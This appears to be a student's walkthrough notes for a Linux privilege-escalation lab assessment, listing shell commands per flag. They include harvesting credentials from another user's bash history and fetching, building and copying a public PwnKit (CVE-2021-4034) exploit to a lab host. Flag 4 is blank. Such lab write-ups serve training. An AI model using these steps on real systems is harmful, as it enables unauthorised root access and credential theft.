## Linux Local Privilege Escalation - Skills Assessment

**Flag 1
```shell-session
grep -rnw / -e "LLPE" 2>/dev/null
```
OR
```shell-session
ls -la
cd .config
ls -la
cat .flag1.txt
```

**Flag 2
```shell-session
cat /home/barry/.bash_history
```
- Found credentials
```shell-session
su barry
cat flag2.txt
```

**Flag 3
```shell-session
id
```
- In adm group
```shell-session
cat /var/log/flag3.txt
```

**Flag 4

**Flag 5
PolKit is running
```shell-session
sudo systemctl start docker
sudo docker run -it --rm ubuntu:20.04 /bin/bash
git clone https://github.com/berdav/CVE-2021-4034.git
cd CVE-2021-4034/
apt install make
apt install -y build-essential
make
cd ..
tar czf cve.tar.gz CVE-2021-4034/
scp cve.tar.gz barry@10.129.235.16:~
```
